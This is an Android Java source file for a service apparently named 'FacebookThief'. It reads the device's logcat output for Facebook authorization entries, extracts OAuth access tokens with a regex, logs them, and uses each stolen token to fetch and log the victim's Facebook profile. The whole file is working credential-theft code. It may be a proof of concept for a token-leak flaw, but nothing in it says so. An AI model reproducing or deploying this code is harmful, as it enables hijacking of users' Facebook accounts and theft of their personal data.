package com.facebookthief;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.json.JSONObject;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import com.facebook.android.Facebook;

public class FacebookThiefService extends Service {

  private Pattern fbPattern = Pattern.compile("access_token=(.*) expires");

  @Override
  public void onStart(Intent intent, int startId) {
    super.onStart(intent, startId);
    Thread t = new Thread() {
      public void run() {
        try {
          Process p = Runtime.getRuntime().exec("logcat -s Facebook-authorize:*");
          InputStream stream = p.getInputStream();
          BufferedReader reader = new BufferedReader(new InputStreamReader(stream));
          while (true) {
            String line = reader.readLine();
            if (line == null)
              continue;
            Matcher m = fbPattern.matcher(line);
            if (m.find()) {
              String token = m.group(1);
              Log.d("FacebookThief", "Found token: " + token);
              Facebook fb = new Facebook("");
              fb.setAccessToken(token);
              Log.d("FacebookThief", "The user: " + new JSONObject(fb.request("me")).toString(2));
            }
          }
        }
        catch (Exception e) {
          e.printStackTrace();
        }
      }
    };
    t.start();
  }

  @Override
  public IBinder onBind(Intent intent) {
    // TODO Auto-generated method stub
    return null;
  }

}
